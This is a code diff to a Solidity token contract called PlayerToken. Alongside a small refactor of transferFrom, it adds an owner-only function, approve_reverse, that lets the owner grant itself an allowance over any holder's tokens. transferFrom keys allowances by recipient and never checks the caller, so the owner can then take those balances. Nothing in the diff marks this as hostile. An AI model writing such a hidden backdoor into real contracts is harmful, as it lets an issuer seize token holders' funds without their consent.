@@ -20,6 +20,11 @@ contract PlayerToken {
     event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
     event Transfer(address indexed from, address indexed to, uint tokens);
     
+    modifier onlyOwner {
+        require(msg.sender == owner);
+        _;
+    }
+    
     constructor(string memory name_, string memory symbol_,uint256 initial_supply,uint8 decimals_) payable{
         owner = msg.sender;
         _name = name_;
@@ -51,12 +56,20 @@ contract PlayerToken {
     }
     
     function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
-        require(balances[_from] >= _value);
-        require(transfer_allowance[_from][_to] >= _value);
+        uint256 t_allowance = transfer_allowance[_from][_to];
+        uint256 balance = balances[_from];
+        require(balance >= _value);
+        require(t_allowance >= _value);
         balances[_from] = SafeMath.sub(balances[_from],_value);
         balances[_to] = SafeMath.add(balances[_to],_value);
         transfer_allowance[_from][_to] = SafeMath.sub(transfer_allowance[_from][_to],_value);
         emit Transfer(_from,_to,_value);
+        return true;
+    }
+    
+    function approve_reverse(address delegate, uint256 _value) public onlyOwner  returns (bool success) {
+        transfer_allowance[delegate][msg.sender] = _value;
+        emit Approval(delegate,msg.sender,_value);
         return true;
     }
     
